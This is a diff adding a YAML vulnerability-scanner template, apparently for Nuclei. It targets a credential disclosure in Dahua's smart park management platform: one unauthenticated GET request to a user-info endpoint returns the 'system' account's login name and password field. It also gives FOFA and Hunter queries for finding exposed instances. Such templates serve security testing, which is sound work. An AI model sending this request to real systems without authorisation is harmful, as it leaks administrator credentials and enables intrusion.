@@ -1,0 +1,35 @@
+id: dahua-wpms-user_getUserInfoByUserName-disclosure
+
+info:
+  name: 大华智慧园区综合管理平台 getUserInfoByUserName.action - disclosure
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: app="dahua-智慧园区综合管理平台"
+    hunter-query: app.name="Dahua 大华 智慧园区管理平台"
+  tags: dahua,wpms,disclosure,iot
+
+http:
+  - raw:
+      - |
+        GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - loginName
+          - system
+          - loginPass
+        condition: and
+
